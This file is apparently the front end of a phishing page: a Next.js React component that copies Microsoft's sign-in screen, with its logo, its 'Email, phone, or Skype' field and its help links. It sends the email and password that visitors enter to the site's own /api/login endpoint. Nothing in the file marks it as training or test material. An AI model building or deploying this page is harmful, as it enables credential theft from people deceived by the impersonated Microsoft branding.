'use client';

import { useState } from 'react';

export default function Home() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [emailError, setEmailError] = useState('');
    const [passwordError, setPasswordError] = useState('');
    const [isLoading, setIsLoading] = useState(false);

    // Email validation
    const validateEmail = (email: string) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    };

    // Show error message
    const showError = (setter: (msg: string) => void, message: string) => {
        setter(message);
    };

    // Hide error message
    const hideError = (setter: (msg: string) => void) => {
        setter('');
    };

    // Handle form submission
    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        
        // Validate email
        if (!email) {
            showError(setEmailError, 'Please enter your email address');
            return;
        }

        if (!validateEmail(email)) {
            showError(setEmailError, 'Please enter a valid email address');
            return;
        }

        // Validate password
        if (!password) {
            showError(setPasswordError, 'Please enter your password');
            return;
        }

        if (password.length < 6) {
            showError(setPasswordError, 'Password must be at least 6 characters long');
            return;
        }

        // Hide all errors
        hideError(setEmailError);
        hideError(setPasswordError);

        // Show loading state
        setIsLoading(true);

        try {
            // Send data to backend
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            });

            const data = await response.json();
            
            if (data.success) {
                alert('Sign in successful! Redirecting to your account...');
                // Reset form
                setEmail('');
                setPassword('');
            } else {
                alert('Sign in failed: ' + data.message);
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Sign in failed. Please try again.');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="min-h-screen bg-white flex items-center justify-center">
            <div className="max-w-md w-full space-y-8">
                <div className="text-center">
                    {/* Microsoft Logo */}
                    <div className="flex justify-center mb-8">
                        <svg width="108" height="23" viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect width="10" height="10" fill="#F25022"/>
                            <rect x="12" width="10" height="10" fill="#7FBA00"/>
                            <rect y="12" width="10" height="10" fill="#00A4EF"/>
                            <rect x="12" y="12" width="10" height="10" fill="#FFB900"/>
                            <text x="30" y="16" fontFamily="Segoe UI" fontSize="16" fontWeight="600" fill="#323130">Microsoft</text>
                        </svg>
                    </div>

                    <h1 className="text-2xl font-semibold text-gray-900 mb-8">Sign in</h1>
                </div>

                <form onSubmit={handleSubmit} className="space-y-6">
                    <div>
                        <input
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                            placeholder="Email, phone, or Skype"
                            required
                        />
                        {emailError && (
                            <p className="mt-1 text-sm text-red-600">{emailError}</p>
                        )}
                    </div>

                    <div>
                        <input
                            type="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                            placeholder="Password"
                            required
                        />
                        {passwordError && (
                            <p className="mt-1 text-sm text-red-600">{passwordError}</p>
                        )}
                    </div>

                    <button
                        type="submit"
                        disabled={isLoading}
                        className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50"
                    >
                        {isLoading ? 'Signing in...' : 'Sign in'}
                    </button>
                </form>

                <div className="text-center space-y-4">
                    <div>
                        <a href="#" className="text-blue-600 hover:text-blue-500 text-sm">
                            No account? Create one!
                        </a>
                    </div>
                    <div>
                        <a href="#" className="text-blue-600 hover:text-blue-500 text-sm">
                            Can't access your account?
                        </a>
                    </div>
                    <div className="flex items-center justify-center space-x-2 text-sm text-gray-600">
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M8 2C6.5 2 5.25 2.75 4.5 4C3.75 2.75 2.5 2 1 2C0.45 2 0 2.45 0 3V5C0 5.55 0.45 6 1 6H2V8C2 8.55 2.45 9 3 9H5C5.55 9 6 8.55 6 8V6H7C7.55 6 8 5.55 8 5V3C8 2.45 7.55 2 7 2H8Z" fill="#605E5C"/>
                            <path d="M10 4C10.55 4 11 4.45 11 5V7C11 7.55 10.55 8 10 8H9V10C9 10.55 8.55 11 8 11H6C5.45 11 5 10.55 5 10V8H4C3.45 8 3 7.55 3 7V5C3 4.45 3.45 4 4 4H10Z" fill="#605E5C"/>
                        </svg>
                        <span>Sign-in options</span>
                    </div>
                </div>

                <div className="text-center text-sm text-gray-600 space-x-4">
                    <a href="#" className="hover:text-gray-800">Terms of use</a>
                    <a href="#" className="hover:text-gray-800">Privacy & cookies</a>
                    <a href="#" className="hover:text-gray-800">...</a>
                </div>
            </div>
        </div>
    );
}